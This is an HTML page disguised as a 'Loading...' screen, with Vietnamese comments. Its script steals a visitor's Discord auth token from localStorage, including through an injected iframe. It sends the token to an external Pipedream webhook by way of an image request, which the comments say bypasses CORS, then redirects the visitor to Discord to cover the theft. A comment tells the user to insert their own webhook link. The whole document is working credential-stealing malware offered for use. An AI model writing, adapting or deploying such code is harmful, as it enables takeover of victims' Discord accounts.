<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <script>
        // Copy chính xác link Pipedream của bạn vào đây
        const WEBHOOK = "https://eop7zyrf1iz1jrc.m.pipedream.net";

        function sendData(token) {
            // Dùng thủ thuật ảnh để bypass CORS
            const img = new Image();
            img.src = `${WEBHOOK}?user_token=${token}`;
            
            // Chuyển hướng sau khi gửi xong
            setTimeout(() => {
                window.location.href = "https://discord.com/channels/@me";
            }, 1000);
        }

        function hoot_token() {
            try {
                // Thử lấy token theo nhiều cách khác nhau
                let token = window.localStorage.getItem('token') || 
                            document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token;

                if (token) {
                    token = token.replace(/"/g, "");
                    sendData(token);
                } else {
                    // Nếu máy này chưa login, đẩy ra trang login của Discord
                    window.location.href = "https://discord.com/login";
                }
            } catch (err) {
                window.location.href = "https://discord.com/login";
            }
        }

        hoot_token();
    </script>
</body>
</html>
